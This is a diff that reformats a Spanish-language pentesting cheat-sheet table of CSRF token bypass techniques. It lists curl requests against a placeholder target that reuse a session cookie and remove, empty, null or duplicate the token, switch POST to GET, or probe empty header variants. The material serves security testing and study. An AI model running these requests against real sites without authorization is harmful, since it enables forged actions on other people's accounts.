@@ -20,15 +20,15 @@ linked:
 
 ## Token No Validado (Remove)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| `curl -X POST -b "session=$COOKIE" https://target/action -d "k=v"` (sin csrf_token field) | Eliminar field por completo | Backend solo valida si presente. |
-| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&k=v"` | Token empty string | Comparación `==` lax permite empty. |
-| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=null&k=v"` | Token literal "null" | String "null" tratada como valid. |
-| `curl -X POST -b "session=$COOKIE" -H "X-CSRF-Token:" https://target/action -d "k=v"` | Header empty | Header strip whitespace antes de comparar. |
-| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&csrf_token=$LEAK"` | Duplicate field — server toma uno u otro | Parser depende del language. |
-| Convertir POST a GET con query string: `curl -G "https://target/action" --data-urlencode "k=v" -b "session=$COOKIE"` | Endpoint acepta GET → no valida CSRF | Method-based bypass. |
-| `for h in 'X-CSRF-Token' 'X-CSRFToken' 'X-XSRF-Token' 'CSRF-Token' 'csrf-token'; do curl ... -H "$h:" ...; done` | Probe variantes de header empty | Multiple header naming. |
+|                                                     **Comando**                                                      |             **Qué obtenés**              |                 **Cuándo**                 |
+| :------------------------------------------------------------------------------------------------------------------: | :--------------------------------------: | :----------------------------------------: |
+|              `curl -X POST -b "session=$COOKIE" https://target/action -d "k=v"` (sin csrf_token field)               |       Eliminar field por completo        |      Backend solo valida si presente.      |
+|                    `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&k=v"`                    |            Token empty string            |     Comparación == lax permite empty.      |
+|                  `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=null&k=v"`                  |           Token literal "null"           |     String "null" tratada como valid.      |
+|                `curl -X POST -b "session=$COOKIE" -H "X-CSRF-Token:" https://target/action -d "k=v"`                 |               Header empty               | Header strip whitespace antes de comparar. |
+|             `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&csrf_token=$LEAK"`              | Duplicate field — server toma uno u otro |        Parser depende del language.        |
+| Convertir POST a GET con query string: `curl -G "https://target/action" --data-urlencode "k=v" -b "session=$COOKIE"` |   Endpoint acepta GET → no valida CSRF   |            Method-based bypass.            |
+|   `for h in 'X-CSRF-Token' 'X-CSRFToken' 'X-XSRF-Token' 'CSRF-Token' 'csrf-token'; do curl ... -H "$h:" ...; done`   |     Probe variantes de header empty      |          Multiple header naming.           |
 ^csrf-bypass-token-remove
 
 ---
